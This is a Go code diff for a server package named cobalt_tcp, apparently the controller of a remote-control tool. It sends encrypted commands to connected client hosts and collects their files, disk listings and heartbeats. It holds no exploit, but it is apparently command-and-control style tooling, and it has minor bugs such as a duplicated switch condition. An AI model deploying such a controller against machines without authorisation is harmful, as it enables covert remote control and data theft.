@@ -2,6 +2,7 @@ package cobalt_tcp
 
 import (
 	cobalt_crypto "My-Comment/cobalt.crypto"
+	cobalt_file "My-Comment/cobalt.file"
 	"bufio"
 	"bytes"
 	"fmt"
@@ -14,9 +15,8 @@ import (
 	"time"
 )
 
-var DEBUG bool = true
+var DEBUG bool = false
 var OPENIP bool = true //是否只按照ip地址区分客户端
-//var ReadOrWrite = "Read"
 
 var Computer = runtime.GOOS //
 var MaxConnect = 30         // 定义最大连接数量
@@ -46,7 +46,7 @@ func (hosts *HOSTS) UseCmd(id int) {
 
 	fmt.Printf("使用quit退出\n")
 	if Computer == "windows" {
-		fmt.Scanf("%s", &b)
+		_, _ = fmt.Scanf("%s", &b)
 	}
 
 	for {
@@ -95,7 +95,7 @@ func (_ HOSTS) Listener(listener net.Listener) {
 			reg := regexp.MustCompile(`\d*\.\d*\.\d*\.\d`)
 			ip = reg.FindString(ip)
 		}
-		_, cmd := addip(ip)
+		_, cmd := addIp(ip)
 		//_ = conn.SetReadDeadline(Time.Time{}.Add(Time.Second * 60))
 		//ipchan[i] = *cmd
 		go PutMsgs(conn, cmd) //复制传输，所以传输后conn的值改变也无妨
@@ -119,23 +119,19 @@ func PutMsgs(conn net.Conn, cmd int) {
 	for {
 		Sends := ""
 		Sends = <-IpChanMap[cmd].Chans
-		if DEBUG {
-			//fmt.Printf("PUT")
-		}
 
 		if regCmd.FindString(Sends) == "Cmd\r\n" {
 			//defer conn.Close()
 			if DEBUG {
 				fmt.Printf("Cmd ： %s\n", Sends)
 			}
+			cobalt_file.MemUser([]byte(Sends))
 			b, err1 := cobalt_crypto.EncodeString(Sends)
-			if err1 != nil {
-				fmt.Printf("cmd加密失败")
-				log.Println(err1)
-			}
+			cobalt_file.PutErr(err1, "cmd加密失败\n")
 			if DEBUG {
 				fmt.Printf("cmd加密内容：%s", b)
 			}
+			//a := base64.StdEncoding.EncodeToString([]byte(b))
 			n1, err := conn.Write([]byte(b)) //写入数据
 			if DEBUG {
 				fmt.Printf("put num = %d\n", n1)
@@ -154,6 +150,7 @@ func PutMsgs(conn net.Conn, cmd int) {
 			temp.Time = time.Now().Format("01-02 15:04:05")
 			IpChanMap[cmd] = temp
 		} else if reg.FindString(Sends) == "Document" {
+			cobalt_file.MemUser([]byte(Sends))
 			if DEBUG {
 				fmt.Printf("原文：%s\n", Sends)
 			}
@@ -162,12 +159,9 @@ func PutMsgs(conn net.Conn, cmd int) {
 				fmt.Printf("发送内容（未加密）：%s\n", file)
 			}
 			b, err1 := cobalt_crypto.EncodeByte([]byte(file))
-			if err1 != nil {
-				fmt.Printf("document加密失败")
-				log.Println(err1)
-			}
-
-			n1, err := conn.Write(b) //写入数据
+			cobalt_file.PutErr(err1, "document加密失败")
+			//a := base64.StdEncoding.EncodeToString(b)
+			n1, err := conn.Write([]byte(b)) //写入数据
 			if DEBUG {
 				fmt.Printf("加密内容%s\n", b)
 			}
@@ -192,13 +186,12 @@ func PutMsgs(conn net.Conn, cmd int) {
 			if DEBUG {
 				fmt.Printf("其他指令类型 ： %s\n", Sends)
 			}
+			cobalt_file.MemUser([]byte(Sends))
 			b, err1 := cobalt_crypto.EncodeByte([]byte(Sends))
-			if err1 != nil {
-				fmt.Printf("其他指令加密失败")
-				log.Println(err1)
-			}
 
-			n1, err2 := conn.Write(b) //写入数据
+			cobalt_file.PutErr(err1, "其他指令加密失败\n")
+			//a := base64.StdEncoding.EncodeToString(b)
+			n1, err2 := conn.Write([]byte(b)) //写入数据
 			if DEBUG {
 				fmt.Printf("put num = %d\n", n1)
 			}
@@ -212,13 +205,7 @@ func PutMsgs(conn net.Conn, cmd int) {
 
 }
 
-//func ReadCmd() {
-//	ReadOrWrite = "Read"
-//}
-//func WriteCmd() {
-//	ReadOrWrite = "Write"
-//}
-func addip(ip string) (*HOSTS, int) {
+func addIp(ip string) (*HOSTS, int) {
 	var host *HOSTS
 	i := 1
 	lens := len(IpChanMap) + 1
@@ -265,24 +252,16 @@ func (hosts HOSTS) PrintHost(i int) {
 }
 
 func GetMsg(conn net.Conn, hosts int) {
-	//regstring := "\\ADocument\\r\\n"
-	//regAlive := "\\AAlive\\r\\n"
-	//regDiskString := "\\ADisk\\r\\n"
-	//regjin := regexp.MustCompile("###")
-	//regA := regexp.MustCompile(regAlive)
-	//reg := regexp.MustCompile(regstring)
-	//regDisk := regexp.MustCompile(regDiskString)
-	//regs := "#EnD#"
-	//regEnd := regexp.MustCompile(regs)
-	GetMsgs := make([]byte, MaxMagString*4)
+	var GetMsgs = make([]byte, 16*MaxMagString)
 	var Messages []byte
 	n, err := conn.Read(GetMsgs)
-	if err != nil {
-		// 信息发送失败报错位置
-		fmt.Printf("接受whoami错误3\n")
-		log.Println(err)
-
+	if DEBUG && n > 1 {
+		fmt.Printf("未处理的原始信息:%s\n%d", GetMsgs, n)
 	}
+	//GetMsgs, _ = base64.StdEncoding.DecodeString(string(GetMsgs))
+
+	cobalt_file.PutErr(err, "接受whoami错误3\n")
+	//需要提出尾部字符
 	temp1, _ := cobalt_crypto.DecodeToString(GetMsgs[:n])
 	strings.Replace(temp1, "\\n", "", -1)
 	if DEBUG {
@@ -302,30 +281,37 @@ func GetMsg(conn net.Conn, hosts int) {
 	if DEBUG {
 		fmt.Printf("whoami: %s\n", GetMsgs)
 	}
-	var err2 error
+	//var err2 error
 	// 开始信息整合处理
 	for {
-		n1, _ := conn.Read(GetMsgs)
 
-		//if err1 != nil {
-		//	fmt.Printf("循环接受失败\n")
-		//	log.Println(err1)
+		n1, err1 := conn.Read(GetMsgs)
+		if DEBUG && n1 > 1 {
+			fmt.Printf("未处理的原始信息2:%s\n%d", GetMsgs, n1)
+		}
+		//GetMsgs, err1 = base64.StdEncoding.DecodeString(string(GetMsgs))
+		if err1 != nil || n1 == 0 {
+			//fmt.Println(err1)
+			if err1 != nil {
+				if DEBUG {
+					log.Println(err1)
+				}
+
+			}
+
+			continue
+		}
+
+		//if DEBUG {
+		//	fmt.Printf("原始消息：%s\n", GetMsgs[:n1])
 		//}
-		if DEBUG {
-			fmt.Printf("原始消息：%s\n", GetMsgs[:n1])
-		}
-		GetMsgs, err2 = cobalt_crypto.DecodeToByte(GetMsgs[:n1])
-		if err2 != nil {
-			fmt.Printf("循环解码错误\n")
-			log.Println(err2)
-		}
-		if DEBUG {
-			fmt.Printf("解密后原始消息 ：%s\n", GetMsgs)
-		}
+		//GetMsgs, err2 = cobalt_crypto.DecodeToByte(GetMsgs[:n1])
+		GetMsgs = GetMsgs[:n1]
+
 		Messages = bytes.Join([][]byte{Messages, GetMsgs}, []byte("")) // 连接起来
-		if DEBUG {
-			fmt.Printf("连接的消息 %s\n", Messages)
-		}
+		//if DEBUG {
+		//	fmt.Printf("连接后的消息 %s\n", Messages)
+		//}
 		for {
 			if bytes.Index(Messages, []byte("!@#$^&*()_+")) != -1 {
 				//取出切片
@@ -333,10 +319,12 @@ func GetMsg(conn net.Conn, hosts int) {
 				if DEBUG {
 					fmt.Printf("坐标位置%d\n", num)
 				}
-
-				putmsg := string(Messages[:num])
-
-				putmsgByte := Messages[:num]
+				//开始解密
+				putmsg, err3 := cobalt_crypto.DecodeToString(Messages[:num])
+				cobalt_file.PutErr(err3, "解密字符失败\n")
+				putmsgByte, err4 := cobalt_crypto.DecodeToByte(Messages[:num])
+				cobalt_file.PutErr(err4, "解密符号失败\n")
+				//putmsgByte := Messages[:num]
 				if DEBUG {
 					fmt.Printf("被分拣出来的内容\n")
 					fmt.Println(putmsg)
@@ -356,9 +344,7 @@ func GetMsg(conn net.Conn, hosts int) {
 				break
 			}
 		}
-		//Aim,err3 := Messages.ReadString("!@#$%^&*()_+") //匹配内容
-		//if if err3 == io.EOF{
-
+		//GetMsgs = []byte("")
 	}
 
 }
@@ -378,6 +364,7 @@ func DealMags(GetMsgs string, hosts int, orgin []byte) {
 		fmt.Printf("传入内容：%s\n", GetMsgs)
 	}
 	if regA.FindString(GetMsgs) == "Alive\r\n" {
+
 		if DEBUG {
 			fmt.Printf("收到心跳包")
 		}
@@ -388,10 +375,7 @@ func DealMags(GetMsgs string, hosts int, orgin []byte) {
 		num := strings.Index(GetMsgs, "Document")
 		//reg.ReplaceAllString(GetMsgs, "${1}")
 		file := orgin[num+10:]
-		//data, _ := ioutil.ReadAll(transform.NewReader(bytes.NewReader([]byte(file)), simplifiedchinese.GBK.NewEncoder()))
-
 		filename := <-IpChanMap[hosts].ChansFileName
-
 		if filename == "" {
 			filename = IpChanMap[hosts].File
 		}
@@ -405,91 +389,18 @@ func DealMags(GetMsgs string, hosts int, orgin []byte) {
 		}
 		files, err5 := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664) //二次打开使用
 		write := bufio.NewWriter(files)
-		if err5 != nil {
-			fmt.Println("文件打开失败")
-			log.Println(err5)
-		}
-		write.Write(file)
-		write.Flush()
+		cobalt_file.PutErr(err5, "文件打开失败\n")
+		_, err2 := write.Write(file)
+		cobalt_file.PutErr(err2, "写入文件失败\n")
+		err3 := write.Flush()
+		cobalt_file.PutErr(err3, "缓冲写入文件失败\n")
 		fmt.Printf("文件保存完成\n")
-		files.Close()
-		//defer files.Close()
-		//if regEnd.FindString(file) == "#EnD#" { //存在###就停止读取
-		//	if DEBUG {
-		//		//fmt.Printf("最后发送的消息是：%s", GetMsgs)
-		//
-		//	}
-		//	if DEBUG {
-		//		fmt.Printf("第一次就发现#EnD#")
-		//	}
-		//	file = strings.Replace(file, "#EnD#", "", -1) //去掉标识符
-		//	//ioutil.WriteFile(filename, []byte(file), 0664)
-		//	write.WriteString(file)
-		//	fmt.Println("文件读取结束")
-		//	write.Flush()
-		//	//goto END
-		//}
-		//if DEBUG {
-		//	fmt.Printf("准备接受二次传输\n")
-		//}
-		//_, err5 = write.WriteString(file)
-		//if err5 != nil {
-		//	fmt.Printf("第%d次写入失败\n", i)
-		//	log.Println(err5)
-		//}
-		//ioutil.WriteFile(filename, []byte(file), 0664)
-		//n2, err3 := conn.Read(GetMsgs) //读取
-		//var err4 error
-		//GetMsgs, err4 = cobalt_crypto.DecodeToByte(GetMsgs[:n2])
-		//if err3 != nil {
-		//	fmt.Println("从socket读取文件失败")
-		//	log.Println(err3)
-		//	break
-		////}
-		//if err4 != nil {
-		//	fmt.Printf("二次接受文件或解码失败")
-		//	log.Println(err3)
-		//}
-		//if regEnd.FindString(string(GetMsgs[:n2])) == "#End#" { //存在###就停止读取
-		//	fmt.Printf("第%d次终于发现#EnD#\n", i+1)
-		//	if DEBUG {
-		//		fmt.Printf("打印该次：\n")
-		//		fmt.Printf("%s", GetMsgs[:n2])
-		//	}
-		//	file2 := string(GetMsgs[:n2])
-		//	//file2 = strings.Replace(file2, "#EnD#", "", -1)
-		//
-		//	write.WriteString(file2)
-		//	write.Flush()
-		//	fmt.Println("文件读取结束")
-		//	break
-		//} else {
-		//	file2 := string(GetMsgs[:n2])
-		//	write.WriteString(file2)
-		//	write.Flush()
-		//	if DEBUG {
-		//		fmt.Printf("文件继续读取")
-		//	}
-		//	if DEBUG {
-		//		//fmt.Printf("最后发送的消息是：%s", file2)
-		//		fmt.Printf("文件第%d次写入", i)
-		//		i++
-		//	}
-		//
-		//}
-		//files.Close()
-		//END:
-		//	//write.Flush()
-		//	fmt.Printf("\n文件保存完成\n")
-		//	temp := IpChanMap[hosts]
-		//	temp.Time = time.Now().Format("01-02 15:04:05")
-		//	IpChanMap[hosts] = temp
-		//	files.Close()
-
+		err4 := files.Close()
+		cobalt_file.PutErr(err4, "")
 	} else if regDisk.FindString(GetMsgs) == "Disk\r\n" {
 		var disknum int
 		//GetMsgs = strings.Replace(GetMsgs, " ", "", 1)
-		GetMsgs = GetMsgs[1:]
+		GetMsgs = strings.Trim(GetMsgs, "")
 		GetMsgs = strings.Replace(GetMsgs, "\r\n", " ", -1)
 		if DEBUG {
 			fmt.Printf("替换后：%s\n", GetMsgs)
@@ -529,167 +440,6 @@ func DealMags(GetMsgs string, hosts int, orgin []byte) {
 			fmt.Printf("收到消息\n")
 		}
 		fmt.Printf("%s", GetMsgs)
-		//if ReadOrWrite == "Write" {
-		//	//	if DEBUG {
-		//	//		fmt.Printf("进入Write模式")
-		//	//	}
-		//	//
-		//	//	filename := <-IpChanMap[hosts].ChansFileName //取出文件名
-		//	//	num := len(filename)
-		//	//	if DEBUG {
-		//	//		fmt.Printf("本次接受的指令有%d\n", num)
-		//	//	}
-		//	//	filename = <-IpChanMap[hosts].ChansFileName //第一个数据处理
-		//	//	files, err6 := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664)
-		//	//	write := bufio.NewWriter(files)
-		//	//	if err6 != nil {
-		//	//		fmt.Printf("一键执行打开文件错误")
-		//	//		log.Println(err6)
-		//	//	}
-		//	//	write.WriteString(b[3:]) //写入第一次
-		//	//	write.Flush()
-		//	//	for {
-		//	//		n3, err7 := conn.Read(GetMsgs)
-		//	//		if err7 != nil {
-		//	//			// 信息发送失败报错位置
-		//	//			fmt.Printf("接受whoami错误3\n")
-		//	//			log.Println(err7)
-		//	//
-		//	//		}
-		//	//		d := string(GetMsgs[:n3])
-		//	//		if regjin.FindString(d[10:]) == "###" {
-		//	//			c := string(GetMsgs[:n3])
-		//	//			write.WriteString(c[:len(c)-3])
-		//	//			write.Flush()
-		//	//			break
-		//	//		}
-		//	//		write.WriteString(b)
-		//	//		write.Flush()
-		//	//
-		//	//	}
-		//	//	//write.Flush()
-		//	//	files.Close()
-		//	//	for i := 1; i < num; i++ { //后几次数据处理
-		//	//		filename = <-IpChanMap[hosts].ChansFileName
-		//	//		files, err6 = os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664)
-		//	//		write = bufio.NewWriter(files)
-		//	//		if err6 != nil {
-		//	//			fmt.Printf("一键执行打开文件错误")
-		//	//			log.Println(err6)
-		//	//		}
-		//	//		for {
-		//	//			n3, err7 := conn.Read(GetMsgs)
-		//	//			if err7 != nil {
-		//	//				// 信息发送失败报错位置
-		//	//				fmt.Printf("接受whoami错误3\n")
-		//	//				log.Println(err7)
-		//	//
-		//	//			}
-		//	//			b = string(GetMsgs[:n3])
-		//	//			if regjin.FindString(b[3:]) == "###" {
-		//	//				c := string(GetMsgs[:n3])
-		//	//				write.WriteString(c[:len(c)-3])
-		//	//				write.Flush()
-		//	//				break
-		//	//			}
-		//	//			write.WriteString(b)
-		//	//			write.Flush()
-		//	//
-		//	//		}
-		//	//		//write.Flush()
-		//	//		files.Close()
-		//	//	}
-		//	//	IpChanMap[hosts].ChansTime <- "ok"
-		//	//if filename == "###" {
-		//	//	IpChanMap[hosts].ChansTime <- "ok"
-		//	//	if DEBUG {
-		//	//		fmt.Printf("接收到文件结束符号\n")
-		//	//	}
-		//	//	break
-		//	//}
-		//	//  打开当前文件
-		//	//files, err6 := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664)
-		//	//write := bufio.NewWriter(files)
-		//	//if err6 != nil {
-		//	//	fmt.Printf("一键执行打开文件错误")
-		//	//	log.Println(err6)
-		//	//}
-		//	//write.WriteString(b[3:]) //写入第一次
-		//	//for strings.Index(b[3:], "###") != -1 {
-		//	//	n3, err7 := conn.Read(GetMsgs)
-		//	//	if err7 != nil {
-		//	//		// 信息发送失败报错位置
-		//	//		fmt.Printf("接受whoami错误3\n")
-		//	//		log.Println(err7)
-		//	//
-		//	//	}
-		//	//	if strings.Index(b[3:], "###") != -1 {
-		//	//		c := string(GetMsgs[:n3])
-		//	//		write.WriteString(c[:len(c)-3])
-		//	//		write.Flush()
-		//	//		break
-		//	//	}
-		//	//	write.WriteString(string(GetMsgs[:n3]))
-		//	//	write.Flush()
-		//	//
-		//	//}
-		//	//write.Flush()
-		//	//files.Close()
-		//	//循环接受
-		//	//判断是否完成写入
-		//	//结束
-		//	//file := b[3 : len(b)-3]
-		//	//ioutil.WriteFile(filename, []byte(file), 0664)
-		//	var allcmd = GetMsgs
-		//	//if strings.Index(GetMsgs, "!@#$%^&*()") != -1 {
-		//	//	allcmd = GetMsgs
-		//	//} else {
-		//	//	allcmd = GetMsgs
-		//	//	for {
-		//	//		n3, err3 := conn.Read(GetMsgs)
-		//	//		if err3 != nil {
-		//	//			fmt.Printf("接受多个参数是失败")
-		//	//			log.Println(err3)
-		//	//		}
-		//	//		if strings.Index(string(GetMsgs[:n3]), "!@#$%^&*()_") != -1 {
-		//	//			allcmd += string(GetMsgs[:n3])
-		//	//			break
-		//	//		} else {
-		//	//			allcmd += string(GetMsgs[:n3])
-		//	//		}
-		//	//	}
-		//	//}
-		//
-		//	filename := <-IpChanMap[hosts].ChansFileName //取出命令数量
-		//	num := len(filename)
-		//	if DEBUG {
-		//		fmt.Printf("本次接受的指令有%d\n", num)
-		//	}
-		//	regcmd := regexp.MustCompile("###(?s:(.*?))###")
-		//	result := regcmd.FindAllStringSubmatch(allcmd, -1)
-		//	for _, text := range result {
-		//		filename = <-IpChanMap[hosts].ChansFileName //取出文件名
-		//
-		//		text1 := strings.Join(text, "")
-		//		ioutil.WriteFile(filename, []byte(text1), 0664)
-		//	}
-		//	IpChanMap[hosts].ChansTime <- "ok"
-		//	//if filename == "###" {
-		//	//	if DEBUG {
-		//	//		fmt.Printf("收到###\n")
-		//	//	}
-		//	//	IpChanMap[hosts].ChansTime <- "ok"
-		//	//} else {
-		//	//	ioutil.WriteFile(filename, []byte(b), 0664)
-		//	//	fmt.Printf("完成%s的写入\n", filename)
-		//	//}
-		//
-		//} else if ReadOrWrite == "Read" {
-		//	fmt.Printf("%s", GetMsgs)
-		//} else {
-		//	fmt.Printf("%s", GetMsgs)
-		//	fmt.Printf("写入模式错误\n")
-		//}
 
 		if DEBUG {
 			fmt.Printf("当前心跳：%s\n", IpChanMap[hosts].Time)
@@ -703,4 +453,29 @@ func DealMags(GetMsgs string, hosts int, orgin []byte) {
 		IpChanMap[hosts] = temp
 	}
 
+}
+
+func DebugSwitch(msg bool) {
+	DEBUG = msg
+	cobalt_crypto.CryphoDebug(msg)
+
+}
+func OpenIpSwitch(msg bool) {
+	OPENIP = msg
+}
+func SwicheSet(msg int) {
+	if msg == 1 { //进入Debug设置
+		if DEBUG {
+			DebugSwitch(false)
+		} else {
+			DebugSwitch(true)
+		}
+
+	} else if msg == 1 {
+		if OPENIP {
+			OpenIpSwitch(false)
+		} else {
+			OpenIpSwitch(true)
+		}
+	}
 }
